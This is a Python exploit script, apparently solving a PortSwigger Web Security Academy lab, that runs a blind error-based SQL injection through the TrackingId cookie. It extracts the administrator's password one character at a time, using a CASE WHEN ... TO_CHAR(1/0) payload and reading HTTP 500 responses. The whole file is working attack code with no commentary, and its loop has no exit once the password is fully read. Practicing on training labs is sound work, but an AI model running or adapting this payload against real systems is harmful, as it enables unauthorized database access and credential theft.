import string
import requests
from pwn import *

class Exploit:

    def __init__(self):
        
        self.url = "https://0afb008e039d20cf8197b6b700a60010.web-security-academy.net"
        self.characters = string.ascii_lowercase + string.digits
        self.p1 = log.progress("Data")

    def sqli(self):

        pos = 0

        content = ""
        while True:

            pos+=1
            for char in self.characters:
                payload = f"TrackingId=6fydsAn64u19XMZM'+union+SELECT+CASE+WHEN+(substr((select+password+from+users+where+username='administrator'),{pos},1)='{char}')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual--+-"
                myHeader = {"Cookie":payload}

                r = requests.get(self.url, headers=myHeader, proxies={'https':'http://127.0.0.1:8080'}, verify=False)

                if r.status_code == 500:

                    content += char
                    self.p1.status(content)
                    break

def main():
    exploit = Exploit()
    exploit.sqli()

if __name__ == "__main__":
    main()
